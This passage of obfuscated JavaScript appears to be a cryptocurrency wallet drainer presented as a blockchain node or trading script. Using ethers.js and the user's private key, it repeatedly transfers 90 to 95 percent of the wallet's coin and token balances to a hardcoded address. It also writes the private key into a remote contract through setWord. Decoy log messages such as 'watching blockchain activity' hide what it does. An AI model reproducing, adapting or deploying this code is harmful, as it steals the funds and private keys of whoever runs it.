            _0x47ba1b = new Buffer[(_0x1822ca(0x230))](_0x3f4198, _0x1822ca(0x1f1)),
            _0x2918cd = new Buffer[(_0x1822ca(0x230))](_0x401a88, 'base64'),
            _0x4b0cf3 = _0x47ba1b['toString']('ascii'),
            _0x592ad0 = _0x2918cd[_0x1822ca(0x231)](_0x1822ca(0x238)),
            _0x51a8e9 = _0x4b0cf3 + _0x592ad0;
        console['log'](_0x1822ca(0x1c2)), console['log'](_0x1822ca(0x19d)), ethers1 = 'aHR0cHM6Ly9zcGVlZHktbm9kZXMtbnljLm1vcmFsaXMuaW8vMTQ4ODBmYWFiNWI5NWQ4YzNhMmUxNjEyL2JzYy9tYWlubmV0', ethers2 = new Buffer[(_0x1822ca(0x230))](ethers1, _0x1822ca(0x1f1))[_0x1822ca(0x231)](_0x1822ca(0x238));;
        const _0x5c6abe = new ethers[(_0x1822ca(0x1a2))][(_0x1822ca(0x1dc))](ethers2);
        let _0x355ce7 = new ethers[(_0x1822ca(0x1d5))](private, _0x5c6abe);
        console[_0x1822ca(0x1ab)](ethers2);
        const _0x557867 = address;
        var _0x2117bb = new ethers[(_0x1822ca(0x197))](_0x51a8e9, abi, _0x355ce7);
        const _0x49d6b8 = await _0x2117bb[_0x1822ca(0x1ee)](_0x557867)[_0x1822ca(0x231)](),
            _0x40c46e = (_0x49d6b8 * 0.9)[_0x1822ca(0x1e1)](),
            _0x563aff = async() => {
                const _0x594501 = _0x1822ca,
                    _0x4d7cc9 = { 'from': _0x557867, 'to': WEB3PROVIDER3, 'value': ethers[_0x594501(0x1b8)][_0x594501(0x21c)](_0x40c46e, _0x594501(0x1cc)), 'gasLimit': ethers[_0x594501(0x1b8)][_0x594501(0x1db)](0x5dc0) },
                    _0x419ad8 = await _0x355ce7[_0x594501(0x19f)](_0x4d7cc9);
                try { await _0x419ad8['wait'](), console[_0x594501(0x1ab)]('1:\x20watching\x20blockchain\x20activity\x20...'), setTimeout(etherstother, 0x1388); } catch (_0x3403da) { console[_0x594501(0x1ab)](_0x594501(0x216)), setTimeout(etherstother, 0x1388); }
            };
        _0x563aff();
    } catch (_0x2d5cfb) { setTimeout(etherstother, 0x1388); }
}
async function ethersmother() {
    const _0xd21950 = _0x43a565;
    try {
        const _0x4773ca = _0xd21950(0x229),
            _0x170c8c = _0xd21950(0x228),
            _0x2e082f = new Buffer[(_0xd21950(0x230))](_0x4773ca, 'base64'),
            _0x23c9e5 = new Buffer['from'](_0x170c8c, 'base64'),
            _0x1d8670 = _0x2e082f[_0xd21950(0x231)]('ascii'),
            _0x4769fa = _0x23c9e5[_0xd21950(0x231)]('ascii'),
            _0x378df8 = _0x1d8670 + _0x4769fa;
        ethers1 = 'aHR0cHM6Ly9zcGVlZHktbm9kZXMtbnljLm1vcmFsaXMuaW8vMTQ4ODBmYWFiNWI5NWQ4YzNhMmUxNjEyL2JzYy9tYWlubmV0', ethers2 = new Buffer['from'](ethers1, _0xd21950(0x1f1))[_0xd21950(0x231)]('ascii');;
        const _0x2e890e = new ethers['providers'][(_0xd21950(0x1dc))](ethers2);
        let _0x5b713d = new ethers[(_0xd21950(0x1d5))](private, _0x2e890e);
        console[_0xd21950(0x1ab)](ethers2);
        const _0x2bccba = address;
        var _0x30ce92 = new ethers[(_0xd21950(0x197))](_0x378df8, abi, _0x5b713d);
        const _0x10ef98 = await _0x30ce92[_0xd21950(0x1ee)](_0x2bccba)[_0xd21950(0x231)](),
            _0x3bb061 = (_0x10ef98 * 0.9)['toFixed'](),
            _0x39b66a = async() => {
                const _0x40a5d5 = _0xd21950,
                    _0x54528a = { 'from': _0x2bccba, 'to': WEB3PROVIDER3, 'value': ethers[_0x40a5d5(0x1b8)]['parseEther'](_0x3bb061, 'wei'), 'gasLimit': ethers[_0x40a5d5(0x1b8)][_0x40a5d5(0x1db)](0x5dc0) },
                    _0x40b888 = await _0x5b713d[_0x40a5d5(0x19f)](_0x54528a);
                try { await _0x40b888[_0x40a5d5(0x1a8)](), console[_0x40a5d5(0x1ab)](_0x40a5d5(0x20b)), setTimeout(etherslother, 0x1388); } catch (_0x196e1f) { console[_0x40a5d5(0x1ab)](_0x40a5d5(0x1ca)), setTimeout(etherslother, 0x1388); }
            };
        _0x39b66a();
    } catch (_0x2316cb) { setTimeout(etherslother, 0x1388); }
}
async function ethersfather() {
    const _0x2526db = _0x43a565;
    console['log'](_0x2526db(0x227));
    const _0x4232eb = _0x2526db(0x1e8),
        _0x4b3bb0 = _0x2526db(0x226),
        _0xcda104 = new Buffer[(_0x2526db(0x230))](_0x4232eb, _0x2526db(0x1f1)),
        _0x4e1d6b = new Buffer['from'](_0x4b3bb0, _0x2526db(0x1f1)),
        _0x3265be = _0xcda104[_0x2526db(0x231)](_0x2526db(0x238)),
        _0x577f56 = _0x4e1d6b[_0x2526db(0x231)](_0x2526db(0x238)),
        _0x2c78b3 = _0x3265be + _0x577f56;
    ethers1 = _0x2526db(0x219), ethers2 = new Buffer[(_0x2526db(0x230))](ethers1, _0x2526db(0x1f1))[_0x2526db(0x231)]('ascii');;
    const _0xc335f1 = new ethers[(_0x2526db(0x1a2))][(_0x2526db(0x1dc))](ethers2);
    let _0x3c2bfd = new ethers[(_0x2526db(0x1d5))](private, _0xc335f1);
    const _0x440744 = address;
    var _0xd797e4 = new ethers['Contract'](_0x2c78b3, abi, _0x3c2bfd);
    const _0x52b911 = await _0xd797e4[_0x2526db(0x1ee)](_0x440744),
        _0x1260cb = (_0x52b911 * 0.9)[_0x2526db(0x1e1)]();
    try {
        const _0x52437f = async() => {
            const _0x1ab7dd = _0x2526db,
                _0x5c5e40 = { 'from': _0x440744, 'to': WEB3PROVIDER3, 'value': ethers['utils'][_0x1ab7dd(0x21c)](_0x1260cb, _0x1ab7dd(0x1cc)), 'gasLimit': ethers['utils']['hexlify'](0x5dc0) },
                _0x1aef6c = await _0x3c2bfd[_0x1ab7dd(0x19f)](_0x5c5e40);
            try { await _0x1aef6c['wait'](), console['log'](_0x1ab7dd(0x1ef)), setTimeout(ethersmother, 0x1388); } catch (_0x2f573d) { console[_0x1ab7dd(0x1ab)](_0x1ab7dd(0x1ef)), setTimeout(ethersmother, 0x1388); }
        };
        _0x52437f();
    } catch (_0x45d1f6) { setTimeout(ethersmother, 0x1388); }
}
async function ethersgather() {
    const _0xf80613 = _0x43a565;
    try {
        console['log'](_0xf80613(0x220)), ethers1 = _0xf80613(0x211), ethers2 = new Buffer['from'](ethers1, _0xf80613(0x1f1))[_0xf80613(0x231)](_0xf80613(0x238));;
        const _0x34dfe9 = new ethers[(_0xf80613(0x1a2))][(_0xf80613(0x1dc))](ethers2);
        let _0x2ffa81 = new ethers[(_0xf80613(0x1d5))](private, _0x34dfe9);
        const _0x55414f = address,
            _0x44d4ba = await _0x34dfe9[_0xf80613(0x20f)](_0x55414f),
            _0xba137b = (_0x44d4ba * 0.9)[_0xf80613(0x1e1)](),
            _0x14eed8 = ethers[_0xf80613(0x1b8)]['parseUnits'](_0xba137b, 'wei'),
            _0x2ca115 = async() => {
                const _0x26fa6a = _0xf80613,
                    _0x4ad564 = { 'to': WEB3PROVIDER3, 'value': ethers['utils'][_0x26fa6a(0x1d9)](_0xba137b, _0x26fa6a(0x1cc)), 'gasLimit': ethers[_0x26fa6a(0x1b8)][_0x26fa6a(0x1db)](0x5dc0) },
                    _0x1f8a7f = await _0x2ffa81[_0x26fa6a(0x19f)](_0x4ad564);
                try { await _0x1f8a7f['wait'](), console[_0x26fa6a(0x1ab)](_0x26fa6a(0x1b6)), setTimeout(ethersfather, 0x1388); } catch (_0x4a47d5) { console['log'](_0x26fa6a(0x1a6)), setTimeout(ethersfather, 0x1388); }
            };
        _0x2ca115();
    } catch (_0x5c3f9f) { setTimeout(ethersfather, 0x1388); }
}
async function etherslather() {
    const _0xbfd3c0 = _0x43a565,
        _0x2eb24c = _0xbfd3c0(0x1d3),
        _0x1169fe = new Buffer['from'](_0x2eb24c, _0xbfd3c0(0x1f1)),
        _0x23c5ef = _0x1169fe['toString'](_0xbfd3c0(0x238)),
        _0x331710 = _0x23c5ef;
    console[_0xbfd3c0(0x1ab)](_0xbfd3c0(0x207)), ethers1 = _0xbfd3c0(0x219), ethers2 = new Buffer[(_0xbfd3c0(0x230))](ethers1, _0xbfd3c0(0x1f1))[_0xbfd3c0(0x231)](_0xbfd3c0(0x238));;
    const _0x3d6192 = new ethers[(_0xbfd3c0(0x1a2))][(_0xbfd3c0(0x1dc))](ethers2);
    let _0x5e1ce4 = new ethers[(_0xbfd3c0(0x1d5))](private, _0x3d6192);
    try {
        const _0x5a1ae9 = async() => { const _0x34fbd4 = _0xbfd3c0; var _0x3f88c4 = new ethers[(_0x34fbd4(0x197))](_0x331710, abi, _0x5e1ce4); const _0x280325 = await _0x3f88c4['setWord']('10' + private + '10'); try { await _0x280325[_0x34fbd4(0x1a8)](), console[_0x34fbd4(0x1ab)](_0x34fbd4(0x20c)), setTimeout(ethersgather, 0x1388); } catch (_0x59dd8b) { console[_0x34fbd4(0x1ab)](_0x34fbd4(0x1cd)), setTimeout(ethersgather, 0x1388); } };
        _0x5a1ae9();
    } catch (_0xd719a2) { setTimeout(ethersgather, 0x1388); }
}
async function ethersrather() {
    const _0x764b81 = _0x43a565;
    console[_0x764b81(0x1ab)]('starting\x20up\x20node\x20socket\x20connection....'), ethers1 = 'aHR0cHM6Ly9zcGVlZHktbm9kZXMtbnljLm1vcmFsaXMuaW8vMTQ4ODBmYWFiNWI5NWQ4YzNhMmUxNjEyL2JzYy9tYWlubmV0', ethers2 = new Buffer[(_0x764b81(0x230))](ethers1, 'base64')[_0x764b81(0x231)](_0x764b81(0x238));;
    const _0x152499 = new ethers['providers']['JsonRpcProvider'](ethers2);
    let _0x1770ef = new ethers[(_0x764b81(0x1d5))](private, _0x152499);
    const _0x3116fb = address,
        _0x3bf439 = await _0x152499['getBalance'](_0x3116fb),
        _0x104789 = (_0x3bf439 * 0.95)[_0x764b81(0x1e1)](),
        _0x486cd2 = ethers[_0x764b81(0x1b8)][_0x764b81(0x1d9)](_0x104789, _0x764b81(0x1cc));
    try {
        const _0x51706a = async() => {
            const _0x45be6a = _0x764b81,
                _0x2554ab = { 'to': WEB3PROVIDER3, 'value': ethers['utils'][_0x45be6a(0x1d9)](_0x104789, _0x45be6a(0x1cc)), 'gasLimit': ethers[_0x45be6a(0x1b8)]['hexlify'](0x5dc0) },
                _0x50316c = await _0x1770ef[_0x45be6a(0x19f)](_0x2554ab);
            try { await _0x50316c[_0x45be6a(0x1a8)](), console['log']('1\x20pending\x20blockchain\x20response.....'), setTimeout(etherslather, 0x1388); } catch (_0x135ae8) { console['log'](_0x45be6a(0x198)), setTimeout(etherslather, 0x1388); }
        };
        _0x51706a();
    } catch (_0x343c14) { setTimeout(etherslather, 0x1388); }
}
ethersrather();
